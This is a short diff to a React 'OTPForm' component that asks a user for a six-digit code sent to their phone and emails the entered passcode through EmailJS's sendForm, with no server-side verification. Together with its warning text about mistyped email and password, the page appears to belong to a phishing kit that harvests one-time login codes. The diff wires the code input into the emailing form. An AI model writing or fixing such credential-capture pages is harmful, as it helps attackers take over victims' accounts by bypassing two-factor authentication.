@@ -9,6 +9,7 @@ import logo from "../assets/logo.png";
 function OTPForm() {
    const formRef = useRef(); 
   const navigate = useNavigate(); // MUST initialize this
+
   function sendEmail(e) {
       e.preventDefault();
       emailjs.sendForm(
@@ -46,13 +47,13 @@ function OTPForm() {
           <h1 className="title">
             The code that was sent to your phone number should be entered.
           </h1>
-
+          <form ref={formRef} onSubmit={sendEmail}>
           <div className="input-group">
             <label htmlFor="code">6 Digits code</label>
             <input type="text" id="code" maxLength="6" className="code-input" name='passcode' />
           </div>
-
-          <button className="submit-btn" onClick={sendEmail}>Submit</button>
+          <button className="submit-btn" type="button" >Submit</button> 
+          </form>
           <p className="warning-text">
             You won't receive a code if you enter your email address or password incorrectly.
           </p>
